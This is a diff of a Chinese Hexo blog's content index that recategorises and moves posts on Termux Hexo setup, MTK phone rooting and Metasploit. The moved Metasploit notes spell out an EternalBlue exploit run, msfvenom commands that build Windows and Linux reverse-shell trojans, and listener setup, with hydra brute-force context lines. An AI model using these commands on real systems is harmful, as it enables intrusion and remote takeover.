@@ -114,7 +114,7 @@ hexo d
 <p>访问用户名.github.io就可以看到默认 hexo 了。</p>
 ]]></content>
       <categories>
-        <category>娱乐技术</category>
+        <category>hexo博客</category>
       </categories>
       <tags>
         <tag>博客</tag>
@@ -139,7 +139,28 @@ hexo d
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
       <categories>
-        <category>娱乐技术</category>
+        <category>hexo博客</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo博客安装方法</title>
+    <url>/2024/07/31/hexo%E5%8D%9A%E5%AE%A2%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="termux安装准备"><a href="#termux安装准备" class="headerlink" title="termux安装准备"></a>termux安装准备</h2><p>pkg换源<br>sed -i ‘s@^(deb.*stable main)$@#\1\ndeb <a href="https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24">https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24</a> stable main@’ $PREFIX&#x2F;etc&#x2F;apt&#x2F;sources.list</p>
+<p>pkg update</p>
+<p>pkg install nodejs-lts<br>pkg install git<br>pkg install vim</p>
+<p>需要在目录下运行安装<br>mkdir hexo<br>chmod 777 hexo<br>cd hexo</p>
+<h2 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h2><p>npm install hexo-cli -g<br>hexo init</p>
+<p>启动命令<br>hexo g<br>hexo s</p>
+<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>git clone -b master <a href="https://github.com/jerryc127/hexo-theme-butterfly.git">https://github.com/jerryc127/hexo-theme-butterfly.git</a> themes&#x2F;butterfly</p>
+<p>vim themes&#x2F;butterfly&#x2F;_config.yml</p>
+<p>vim编辑根目录下_config.yml中的theme：butterfly<br>npm install hexo-renderer-pug hexo-renderer-stylus –save</p>
+<h2 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h2><p>都通过修改文件themes&#x2F;butterfly&#x2F;_config.yml中的模块，根据相关备注修改模块。</p>
+]]></content>
+      <categories>
+        <category>hexo博客</category>
       </categories>
       <tags>
         <tag>博客</tag>
@@ -216,30 +237,9 @@ hydra -m cloud -P 密码字典 IP cisco-enable
       </tags>
   </entry>
   <entry>
-    <title>hexo博客安装方法</title>
-    <url>/2024/07/31/hexo%E5%8D%9A%E5%AE%A2%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="termux安装准备"><a href="#termux安装准备" class="headerlink" title="termux安装准备"></a>termux安装准备</h2><p>pkg换源<br>sed -i ‘s@^(deb.*stable main)$@#\1\ndeb <a href="https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24">https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24</a> stable main@’ $PREFIX&#x2F;etc&#x2F;apt&#x2F;sources.list</p>
-<p>pkg update</p>
-<p>pkg install nodejs-lts<br>pkg install git<br>pkg install vim</p>
-<p>需要在目录下运行安装<br>mkdir hexo<br>chmod 777 hexo<br>cd hexo</p>
-<h2 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h2><p>npm install hexo-cli -g<br>hexo init</p>
-<p>启动命令<br>hexo g<br>hexo s</p>
-<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>git clone -b master <a href="https://github.com/jerryc127/hexo-theme-butterfly.git">https://github.com/jerryc127/hexo-theme-butterfly.git</a> themes&#x2F;butterfly</p>
-<p>vim themes&#x2F;butterfly&#x2F;_config.yml</p>
-<p>vim编辑根目录下_config.yml中的theme：butterfly<br>npm install hexo-renderer-pug hexo-renderer-stylus –save</p>
-<h2 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h2><p>都通过修改文件themes&#x2F;butterfly&#x2F;_config.yml中的模块，根据相关备注修改模块。</p>
-]]></content>
-      <categories>
-        <category>娱乐技术</category>
-      </categories>
-      <tags>
-        <tag>博客</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mtk手机root</title>
+    <title>oppoA9 mtk手机root</title>
     <url>/2024/08/01/mtk%E6%89%8B%E6%9C%BAroot/</url>
-    <content><![CDATA[<h2 id="mtk手机root"><a href="#mtk手机root" class="headerlink" title="mtk手机root"></a>mtk手机root</h2><p>通过mtkclient工具和手机的漏洞，连接后导出boot文件，修补后导回，完成root。</p>
+    <content><![CDATA[<h2 id="mtk手机root"><a href="#mtk手机root" class="headerlink" title="mtk手机root"></a>mtk手机root</h2><p>通过mtkclient工具连接手机漏洞后，导出boot文件，修补后导回，完成root。</p>
 <p>mkclient下载地址，可通过下方网友地址，或者github上获取：</p>
 <pre><code>https://xinkid.lanzouv.com/b075nltgh 密:canxin
 </code></pre>
@@ -249,10 +249,66 @@ hydra -m cloud -P 密码字典 IP cisco-enable
 <p><img src="/images/pasted-3.png" alt="upload successful"></p>
 ]]></content>
       <categories>
-        <category>娱乐技术</category>
+        <category>手机搞机</category>
       </categories>
       <tags>
         <tag>手机root</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>msfconsole命令</title>
+    <url>/2024/08/01/msfconsole%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h2><p>软件更新</p>
+<pre><code>apt update # 更新安装包信息；只检查，不更新
+apt upgrade # 更新已安装的软件包，不删除旧包； 
+apt full-upgrade # 升级包，删除旧包
+</code></pre>
+<p>基础使用</p>
+<pre><code>msfconsole //进入框架
+search  ms17_010 //使用search命令查找相关漏洞
+use exploit/windows/smb/ms17_010_eternalblue //使用use进入模块
+info //使用info查看模块信息
+show options //查看参数
+set  RHOST  192.168.100.158 //设置参数
+exploit/run
+</code></pre>
+<p>辅助模块(auxiliary)</p>
+<p>漏洞利用(exploit)</p>
+<p>攻击载荷(payload)：<br>    Stager中几种常见的payload：<br>    windows&#x2F;meterpreter&#x2F;bind_tcp       &#x2F;&#x2F;正向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_tcp    &#x2F;&#x2F;反向连接，常用<br>    windows&#x2F;meterpreter&#x2F;reverse_http   &#x2F;&#x2F;通过监听80端口反向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_https  &#x2F;&#x2F;通过监听443端口反向连接</p>
+<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>windows木马<br>创建木马</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o 123.exe
+</code></pre>
+<p>开启kali监听</p>
+<pre><code>启动msfconsole
+开启监听
+    use exploit/multi/handler
+设置tcp监听
+    set payload windows/meterpreter/reverse_tcp
+设置本机ip和端口
+    set
+输入explore开始监听
+</code></pre>
+<p>运行木马后木马上线，进入meterpreter</p>
+<p>后续同上，不做详细解释</p>
+<p>linux elf木马反弹shell创建（msf6版本）</p>
+<pre><code>    msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf
+</code></pre>
+<p>监听</p>
+<pre><code>msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set lhost xxx.xxx.xxx.xxx
+set lport 8888
+run
+</code></pre>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>kali</tag>
+        <tag>渗透命令</tag>
       </tags>
   </entry>
   <entry>
@@ -365,62 +421,6 @@ hydra -m cloud -P 密码字典 IP cisco-enable
 <td align="center">TCP空扫描欺骗防火墙</td>
 </tr>
 </tbody></table>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>kali</tag>
-        <tag>渗透命令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>msfconsole命令</title>
-    <url>/2024/08/01/msfconsole%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h2 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h2><p>软件更新</p>
-<pre><code>apt update # 更新安装包信息；只检查，不更新
-apt upgrade # 更新已安装的软件包，不删除旧包； 
-apt full-upgrade # 升级包，删除旧包
-</code></pre>
-<p>基础使用</p>
-<pre><code>msfconsole //进入框架
-search  ms17_010 //使用search命令查找相关漏洞
-use exploit/windows/smb/ms17_010_eternalblue //使用use进入模块
-info //使用info查看模块信息
-show options //查看参数
-set  RHOST  192.168.100.158 //设置参数
-exploit/run
-</code></pre>
-<p>辅助模块(auxiliary)</p>
-<p>漏洞利用(exploit)</p>
-<p>攻击载荷(payload)：<br>    Stager中几种常见的payload：<br>    windows&#x2F;meterpreter&#x2F;bind_tcp       &#x2F;&#x2F;正向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_tcp    &#x2F;&#x2F;反向连接，常用<br>    windows&#x2F;meterpreter&#x2F;reverse_http   &#x2F;&#x2F;通过监听80端口反向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_https  &#x2F;&#x2F;通过监听443端口反向连接</p>
-<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>windows木马<br>创建木马</p>
-<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o 123.exe
-</code></pre>
-<p>开启kali监听</p>
-<pre><code>启动msfconsole
-开启监听
-    use exploit/multi/handler
-设置tcp监听
-    set payload windows/meterpreter/reverse_tcp
-设置本机ip和端口
-    set
-输入explore开始监听
-</code></pre>
-<p>运行木马后木马上线，进入meterpreter</p>
-<p>后续同上，不做详细解释</p>
-<p>linux elf木马反弹shell创建（msf6版本）</p>
-<pre><code>    msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf
-</code></pre>
-<p>监听</p>
-<pre><code>msfconsole
-use exploit/multi/handler
-set payload linux/x64/meterpreter/reverse_tcp
-set lhost xxx.xxx.xxx.xxx
-set lport 8888
-run
-</code></pre>
 ]]></content>
       <categories>
         <category>网络安全</category>
